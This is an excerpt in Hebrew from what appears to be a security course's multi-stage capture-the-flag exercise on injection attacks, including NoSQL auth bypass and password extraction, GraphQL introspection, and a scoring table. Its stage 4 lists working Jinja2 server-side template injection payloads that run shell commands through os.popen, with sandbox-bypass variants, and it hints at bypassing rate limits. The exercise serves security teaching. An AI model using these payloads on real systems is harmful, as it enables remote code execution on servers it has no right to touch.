...
אתגר CTF רב-שלבי שמשלב את כל טכניקות הinjection שלמדנו בפרק הזה. כל שלב דורש זיהוי וexploit של סוג injection שונה. השלמת כל שלב נותנת רמז או גישה לשלב הבא.
...
- נסו aliases לbypass rate limiting

---

## שלב 4 - chaining SSTI ל-RCE
...
```python
# Attempt 1 - via lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# Attempt 2 - via cycler with string chaining
{% set a='po'%}{%set b='pen'%}{{cycler.__init__.__globals__.os[a~b]('id').read()}}

# Attempt 3 - via request.args
{{request|attr(request.args.a)}}?a=__class__

# Attempt 4 - hex encoding
...
| שלב 2 - Auth Bypass | 10 | הbypass אותנטיקציה |
| שלב 2 - extraction סיסמה | 20 | הextraction מלא עם $regex |
| שלב 2 - Flag | 5 | קריאת ה-flag |
| שלב 3 - Introspection | 10 | חשיפת הסכמה |
| שלב 3 - extraction נתונים | 15 | מציאת המידע הרגיש |
| שלב 3 - Flag | 5 | קריאת ה-flag |
| שלב 4 - Sandbox Bypass | 25 | הbypass ה-sandbox |
...
2. **סקריפטים** שכתבתם לאוטומציה (extraction סיסמה, סריקה, וכו')
